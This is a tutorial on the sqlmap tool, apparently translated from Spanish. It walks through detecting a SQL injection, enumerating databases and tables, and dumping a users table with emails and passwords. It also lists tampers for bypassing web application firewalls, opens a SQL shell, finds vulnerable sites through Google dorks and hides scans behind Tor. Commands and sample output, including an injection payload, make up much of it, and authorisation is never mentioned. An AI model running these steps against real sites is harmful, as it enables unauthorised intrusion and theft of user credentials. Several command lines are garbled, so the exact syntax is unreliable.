# Automated sql injections using SQLMAP

## TOPICS


* [Introduction](#Introduction)
* [What is sqlmap?](#What-is-sqlmap?)
* [Sqlmap install](#sqlmap-install)
* [Basic usage of sqlmap](#Basic-usage-of-sqlmap)
  * [GET method](#GET-method)
  * [POST method](#POST-method)
* [Basic sql injection step by step](#Basic-sql-injection-step-by-step)
* [Tampers](#Tampers)
  * [What is a Tamper](#What-is-a-Tamper)
  * [Function of a Tamper](#Function-of-a-Tamper)
  * [How to use the tampers?](#How-to-use-the-tampers?)
  * [Most-used Tampers](#Most-Used-Tampers)
    * [MySQL](#MySQL)
    * [MSSQL](#MSSQL)
    * [MSAccess](#MSAccess)
    * [PostgreSQL](#PostgreSQL)
    * [SQLite](#SQLite)
* [Techniques](#Techniques)
  * [Boolean-based blind](#Boolean-based-blind)
  * [Error-based](#Error-based)
  * [Union query-based](#Union-query-based)
  * [Stacked queries](#Stacked-queries)
  * [Time-based blind](#Time-based-blind)
  * [Inline queries](#Inline-queries)
* [Risk and Level](#Risk-y-Level)
* [SQL-SHELL](#SQL-SHELL)
* [SQL-query](#SQL-query)
* [Sqlmap and dorks](#Sqlmap-and-dorks)
* [Anonymous scans with Tor](#Anonymous-scans-with-Tor)


## What is sqlmap?

SQLMap is a tool to exploit the SQL injection vulnerability. This tool automates the attack in order to exploit the page.


## sqlmap installation

To begin with I would like to leave the official page here: `http: // sqlmap.org /`

Sqlmap is a tool that works in python in its versions: 2.6, 2.7 and 3.x on all platforms, so there is no problem to use it, personally I have used it in windows, linux and in termux and it works excellent in all of them.

The first thing we have to do is have git installed to be able to clone its official repository to our device, the site in git is the following:

https://github.com/sqlmapproject/sqlmap.git

to clone it we use the following:

git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev

Once we have cloned the repository, we go to the `sqlmap-dev` folder and execute the` sqlmap.py` file:

`python sqlmap.py`


## Basic use of sqlmap

To see the help options for this tool, just use the following:

`sqlmap.py -h`

What will return the basic options to make a correct use of this tool, something that must be understood well is the correct order of execution to add the options:

`sqlmap.py --option -u URL`

Something we have to keep in mind is that this tool allows us to make scans from the GET and POST method:

### GET method

Sqlmap automatically uses the GET method to work, the syntax is as follows:

`sqlmap.py -u" http://www.examplepage.com/something.php?id=1&id2=1&id3=1 "`

Something very important to keep in mind is that sqlmap scans the page parameter by parameter, this means that if we have a page with more than one parameter we have to specify the parameter that we want to analyze or scan all one by one.

### POST method

To use the POST method we have to tell the tool that we will use this method, for that we use:

`--method POST`

After declaring that we will use the post method we have to declare the parameters that we are going to analyze, for that we use:

`--data`

Example:

`sqlmap.py -u" http://www.examplepage.com/something.php "- method POST --data" id = 1 & id2 = 1 & id3 = 1 "`

After being clear about the methods with which we can do the scan, we have to know the basic and general options to do a basic scan.

In the options we can highlight the most general and important, for example:

```
| -p parameter | It is used to determine the parameter that we want to analyze |

| --current-user | We extract the username with which we interact with the database |

| --current-db | It extracts the name of the database in which we are |

| --dbs | It will give us the number of databases and will show us the name of each of them |

| -D name | It allows us to enter the selected database |

| --tables | It will show us the number of tables within a database and the names of each of the tables |

| -T name | It allows us to enter the selected table | 

| --column | It will extract the number of the columns within a table and show us the name of each of them |

| -C name | It allows us to select the column |

| --dump | It allows us to extract content from the database |

| --dump-all | It extracts everything from the database |


```

Once we know the basic options of the tool, we will see an example of how to use it:

## Basic sql injection step by step

For this example we will simulate that we have a vulnerable page by the GET method, we will use the following url:

`sqlmap.py -u" http://www.examplepage.com/something.php?id=1&id2=1&id3=1 "`

When you start the scan, it is divided into parts:

It will scan the connection to the page.
It will scan the page for any WAF or IPS:

`[INFO] checking if the target is protected by some kind of WAF / IPS`

At the end of the scan, something like this will appear:
```
[*] starting at 12:10:33

[12:10:33] [INFO] resuming back-end DBMS 'mysql' 
[12:10:34] [INFO] testing connection to the target url
sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
---
Place: GET
Parameter: id
    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
    Payload: id=3 AND (SELECT 1489 FROM(SELECT COUNT(*),CONCAT(0x3a73776c3a,(SELECT (CASE WHEN (1489=1489) THEN 1 ELSE 0 END)),0x3a7a76653a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
---
[12:10:37] [INFO] the back-end DBMS is MySQL
web server operating system: FreeBSD
web application technology: Apache 2.2.22
back-end DBMS: MySQL 5

```
This means that the scan is finished, that the page is vulnerable and that we managed to attack it successfully. The next thing is to extract the name of the database, to extract the name of the databases we are going to use the `--dbs` option:

`sqlmap.py -u" http://www.examplepage.com/something.php?id=1&id2=1&id3=1 "--dbs`

When we finish we will have the names of the databases, something like this:

```
[*] starting at 12:12:56

[12:12:56] [INFO] resuming back-end DBMS 'mysql' 
[12:12:57] [INFO] testing connection to the target url
sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
---
Place: GET
Parameter: id
    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
    Payload: id3=1 AND (SELECT 1489 FROM(SELECT COUNT(*),CONCAT(0x3a73776c3a,(SELECT (CASE WHEN (1489=1489) THEN 1 ELSE 0 END)),0x3a7a76653a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
---
[12:13:00] [INFO] the back-end DBMS is MySQL
web server operating system: FreeBSD
web application technology: Apache 2.2.22
back-end DBMS: MySQL 5
[12:13:00] [INFO] fetching database names
[12:13:00] [INFO] the SQL query used returns 2 entries
[12:13:00] [INFO] resumed: information_schema
[12:13:00] [INFO] resumed: nombre_DB
available databases [2]:
[*] information_schema
[*] nombre_DB
```

With this we have the databases, in this example we have `2`:

```
[*] information_schema
[*] nombre_DB
```

Now, we are going to enter the database `DB_name` and extract the name of the tables:

`sqlmap.py -u "http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1" -D nombre_DB --tables`

At the end of the scan we have something like this:

```
[11:55:18] [INFO] the back-end DBMS is MySQL
web server operating system: FreeBSD
web application technology: Apache 2.2.22
back-end DBMS: MySQL 5
[11:55:18] [INFO] fetching tables for database: 'nombre_DB'
[11:55:19] [INFO] heuristics detected web page charset 'ascii'
[11:55:19] [INFO] the SQL query used returns 3 entries
[11:55:20] [INFO] retrieved: users
[11:55:21] [INFO] retrieved: another_table
[11:55:21] [INFO] retrieved: hello_am_another_table
```

At the end we have the following tables:

`users, another_table, hello_am_another_table`

The next thing is to select a table and extract the columns within it:

`sqlmap.py -u" http://www.examplepage.com/something.php?id=1&id2=1&id3=1 "-D DB_name -T users --columns`

At the end we have something like this:

```
[12:17:39] [INFO] the back-end DBMS is MySQL
web server operating system: FreeBSD
web application technology: Apache 2.2.22
back-end DBMS: MySQL 5
[12:17:39] [INFO] fetching columns for table 'users' in database 'safecosmetics'
[12:17:41] [INFO] heuristics detected web page charset 'ascii'
[12:17:41] [INFO] the SQL query used returns 4 entries
[12:17:42] [INFO] retrieved: id
[12:17:43] [INFO] retrieved: int(11)                                                                                         
[12:17:45] [INFO] retrieved: name                                                                                            
[12:17:46] [INFO] retrieved: text                                                                                            
[12:17:47] [INFO] retrieved: passwd                                                                                        
[12:17:48] [INFO] retrieved: text                                                                                            

.......

[12:17:59] [INFO] retrieved: hash
[12:18:01] [INFO] retrieved: varchar(128)
Database: nombre_DB
Table: users
[8 columns]
+-------------------+--------------+
| Column            | Type         |
+-------------------+--------------+
| email             | text         |
| id                | int(11)      |
| name              | text         |
| passwd            | text         |
+-------------------+--------------+
```

We have the following columns:

`id, name, email, passwd`

Finally we have to extract the content of those columns:

`sqlmap.py -u" http://www.examplepage.com/something.php?id=1&id2=1&id3=1 "-D DB_name -T users -C id, name, email, passwd --dump`

At the end we have something like this:

```
+ ---- + ---------- + --------------------- + ------------------- +
| id   |    name    |         email         |       password      |
+ ---- + ---------- + --------------------- + ------------------- +
|    0 |    pepito  |    pepito@correo.com  |   secure password   |
+ ---- + ---------- + --------------------- + ------------------- +

``` 

With this we have already extracted the information that is inside the columns.


Once we have seen the basic use for the use of this tool we go to the next step, in the previous example we used as a sample an invented page where everything worked from the first, but being realistic that does not always happen, we will always find with more "complicated" websites and it is from this point where it becomes more interesting. let's see the use of TAMPERS

Other important options that we are going to see are:

```
| --random-agent | Which allows us to "change" the user agent with which the queries are executed |

| --proxy = proxy | Which allows us to connect to the page we want to scan through a proxy |

| --level = 1-5 | This allows us to modify the level with which we want to make the scan, by default it is in level 1 but we can change it to 5 to make the scan more intrisive |

| --risk = 1-3 | In the same way as --level, risk allows us to change the level with which we want to do the scan, adding more aggressiveness but at the same time making more noise, this can be configured from 1 to 3, coming by default at number 1 |

```

## TAMPERS

### What is a Tamper

A tamper is a python file that gives us the option to "camouflage" the payloads used by the sqlmap tool in order to "bypass" some WAF.

Sqlmap has a wide variety of Tampers to help the sql injection to be fulfilled, each Tamper has its function and its compatibility, in some cases these can be mixed for a better result.

We can see the complete list of tampers inside the sqlmap repo

`https: // github.com / sqlmapproject / sqlmap / tree / master / tamper`

### Function of a Tamper

Each tamper has its own functionality, in this case we are going to see just a few examples to see how the tampers are designed and see how they work.

as an example we will analyze the tamper: randomcomments

`https: // github.com / sqlmapproject / sqlmap / blob / master / tamper / randomcomments.py`

we can see its function in a part of its code:

```
import re

from lib.core.common import randomRange
from lib.core.compat import xrange
from lib.core.data import kb
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def tamper(payload, **kwargs):
    """
    Add random inline comments inside SQL keywords (e.g. SELECT -> S/**/E/**/LECT)
    >>> import random
    >>> random.seed(0)
    >>> tamper('INSERT')
    'I/**/NS/**/ERT'
    """
```
Basically what it does is add comments on the words used in the payload, example:

```
SELECT -> S/**/E/**/LECT

UNION -> UN/**/I/**/ON
```

### How to use tampers?

To make use of a tamper or several tampers in the scanning of a website we have to specify it with the following option:

`--tamper =" tampername "`

If we want to use more than one tamper we only have to use one, to separate them:

`--tamper =" tampername1, tampername2, tampername3, etc "`

So, we have the following line with the added tampers:

`sqlmap.py -u" http://www.examplepage.com/something.php?id=1&id2=1&id3=1 "--tamper =" tampername1, tampername2, tampername3, etc "`


### Most used tampers

In order to classify the most used tampers we must first separate the tampers to organize them, as I mentioned before, each tamper is different and each one is used for different things, so we are going to separate the tampers by databases where they work:

We have the following:

#### MySQL

```
space2randomblank
unionalltounion
unmagicquotes
versionedkeywords
versionedmorekeywords
xforwardedforbetween
bluecoat
charencode
charunicodeencode
concat2concatws
equaltolike
greatest
halfversionedmorekeywords
ifnull2ifisnull
space2morehash
space2mysqldash
space2plus
modsecurityversioned
modsecurityzeroversioned
multiplespaces
securesphere
space2comment
space2hash
nonrecursivereplacement
percentage
randomcase

```

#### MSSQL

```
sp_password
space2comment
space2dash
space2mssqlblank
space2mysqldash
space2plus
space2randomblank
charencode
charunicodeencode
equaltolike
greatest
unionalltounion
unmagicquotes
multiplespaces
nonrecursivereplacement
percentage
randomcase
securesphere

```

#### MSAccess

```
modsecurityversioned
modsecurityzeroversioned
equaltolike
greatest
halfversionedmorekeywords
nonrecursivereplacement
percentage
randomcase
securesphere
between
bluecoat
charencode
charunicodeencode
concat2concatws
space2comment
space2hash
space2morehash
space2mysqldash
space2plus
space2randomblank
unionalltounion
unmagicquotes
versionedkeywords
versionedmorekeywords
ifnull2ifisnull
multiplespaces

```

#### PostgreSQL

```
xforwardedfor
space2comment
space2plus
space2randomblank
between
charencode
charunicodeencode
equaltolike
greatest
multiplespaces
nonrecursivereplacement
percentage
randomcase
securesphere
between

```

#### SQLite 

``` 
space2plus
unionalltounion
unmagicquotes
xforwardedfor
ifnull2ifisnull
randomcase
securesphere
space2comment
space2dashmmultiplespaces
nonrecursivereplacement

```
### Techniques 

Another important point is to know the techniques that this tool uses.

As we know, sqlmap uses many types of payloads which are classified into 6 parts, which are:

```
B: Boolean-based blind
E: Error-based
U: Union query-based
S: Stacked queries
T: Time-based blind
Q: Inline queries

```
#### Boolean-based blind

Boolean-based blind means that the vulnerability is based on Boolean values ​​(true or false) and is said to be blind because it does not show any sign that there is an error on the page.

#### Error-based

Error-based means that the injection is based on the error messages that the server responds and thus knows a little more about the structure of the database that is being used.

#### Union query-based

Union query-based means that we are taking advantage of the fact that the UNION operator from sql can be used, thanks to this we can combine statements that will be displayed as part of the server's response.

#### Stacked queries

Stacked queries means that the vulnerability is based on adding more sql queries in series, in this way sending a normal query and at the same time sending the attacker's query, all this only dividing the queries with a ";".

#### Time-based blind

Time-based blind is when the vulnerability is time-based, which means that an attacker will send an sql query forcing the database to wait a certain amount of time, if the server response time is the same time as the attacker stated in the sentence, this means that he is vulnerable.

#### Inline queries

Inline queries consists of joining one sql query inside another and so on to see if the statement is executed.

Now that we know which techniques and what type of error each one focuses on, let's see how to use them.


To use any technique within the scan we have to declare the following option:

``
--technique = TECH SQL injection techniques to use (default "BEUSTQ")
``
Sqlmap by default uses all the techniques at the same time, which is the same as:

``
--technique = BEUSTQ
``

This is very good, since the tool makes our work much easier but at the same time this makes the scan take longer as it scans for all errors to detect it. Before doing a scan we have to try to collect as much information as possible to make the scan easier and save more time, such as detecting what error we are seeing and thus declaring what type of error we want to exploit using a technique for that specific type of error, thanks to this we tell the tool to focus only on that type of error and make the scan faster and more direct.

for example:

`sqlmap.py -u" http://www.examplepage.com/something.php?id=1&id2=1&id3=1 "--technique = B``sqlmap.py -u "http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1" --technique=B`


### Risk and Level

Another very important thing is to know the "Risk" and Level ":

Risk: risk of an error occurring. The payloads that have the least risk are those of risk 1, and those that have the most risk 2.

Level: number of requests per payload. Level 1 makes few requests while level 5 makes many.

### SQL-shell

the `--sql-shell` option loads us a SQL shell from which we can work

Example:

`sqlmap.py -u" http://www.examplepage.com/something.php?id=1&id2=1&id3=1 "--sql-shell`

### SQL-query

the `--sql-query` option

#### Sqlmap and dorks

Sqlmap also allows us to do a search through google dorks to find vulnerable pages, this is done with the following sequence:


`sqlmap.py -g DORK`

example:

`sqlmap.py -g" inurl: \ ". php? id = 1 \" "`


### Anonymous scans with Tor

One of the most important parts when doing a job in the area of ​​computer security is knowing how to take care of yourself a little, for that is anonymity is essential, in this case we are going to use TOR to filter the requests.

`sqlmap.py --tor --tor-type = SOCKS5 --check-tor -u" http://www.examplepage.com/something.php?id=1&id2=1&id3=1 "`


To finish I would like to thank you for dedicating a little of your time to this writing, if you like you can share it.
